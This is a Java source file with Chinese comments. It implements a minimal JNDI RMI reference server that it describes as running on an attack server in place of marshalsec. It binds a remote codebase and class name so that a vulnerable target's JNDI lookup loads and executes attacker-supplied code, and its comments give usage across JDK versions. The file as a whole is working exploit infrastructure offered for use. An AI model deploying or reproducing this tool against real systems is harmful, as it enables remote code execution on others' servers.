import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

/** JNDI RMI 引用服务（替代 marshalsec 的最小实现，运行在攻击服务器上）。
 *
 * 用法（com.sun.jndi.rmi.registry 随 JDK 版本搬家，逐级回退）:
 *   JDK 17+: java --add-modules jdk.naming.rmi \
 *             --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED \
 *             --add-opens  jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED \
 *             -cp . RMIServer <port> <codebase> <className>
 *   JDK 9-16: 同上去掉 --add-modules，模块名换成 java.naming
 *   JDK 8:    java -cp . RMIServer <port> <codebase> <className>
 * - 注意 JDK 8u191+ / 11.0.1+ 默认关闭 trustURLCodebase，RMI/LDAP 远程类加载同样失效，
 *   这类高版本目标需要其他绕过链（本工具暂不内置）。
 */
public class RMIServer {
    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.err.println("usage: RMIServer <port> <codebase> <className>");
            System.exit(1);
        }
        int port = Integer.parseInt(args[0]);
        String codebase = args[1];
        String className = args[2];

        Registry registry = LocateRegistry.createRegistry(port);
        Reference ref = new Reference(className, className, codebase);
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind(className, wrapper);
        System.out.println("RMI registry listening on " + port + " -> " + codebase + " (" + className + ")");
    }
}
